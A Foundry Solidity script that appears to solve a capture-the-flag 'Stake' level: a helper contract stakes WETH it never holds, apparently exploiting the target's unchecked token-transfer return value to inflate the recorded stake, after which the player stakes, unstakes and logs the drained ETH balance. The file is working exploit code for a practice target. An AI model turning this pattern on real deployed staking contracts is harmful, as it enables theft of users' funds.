// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Stake.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract StakeScript is Script {
    Stake public target;
    ERC20 public weth;
    function setUp() public {
        target = Stake(0x867b1f112D62C69901b076F89175DF25c90A78d2);
        weth = ERC20(target.WETH());
    }

    function run() public {
        vm.startBroadcast();

        uint256 value_ = 0.002 ether;
        address player = vm.envAddress("ADDR");

        bool success = weth.approve(address(target), type(uint256).max);
        require(success, "approve failed");

        console.log("before total ETH Balance: ", address(target).balance);
        console.log("before total totalStaked: ", target.totalStaked());
        console.log("before user balance: ", target.UserStake(player));
        
        Attack a = new Attack{value: 0.01 ether}(target, weth);
        a.a();        

        target.StakeETH{value: value_}();
        target.StakeWETH(0.0011 ether);
        target.Unstake(value_ + 0.0011 ether);

        console.log("after total ETH Balance: ", address(target).balance);
        console.log("after total totalStaked: ", target.totalStaked());
        console.log("after user balance: ", target.UserStake(player));

        vm.stopBroadcast();
    }

}

contract Attack {
    Stake public target;
    ERC20 public weth;

    constructor(Stake target_, ERC20 weth_) payable {
        target = target_;
        weth = weth_;
    }

    function a() external {
        bool success = weth.approve(address(target), type(uint256).max);
        require(success, "approve failed");
        target.StakeWETH(0.1 ether);
    }

    receive() payable external {}
}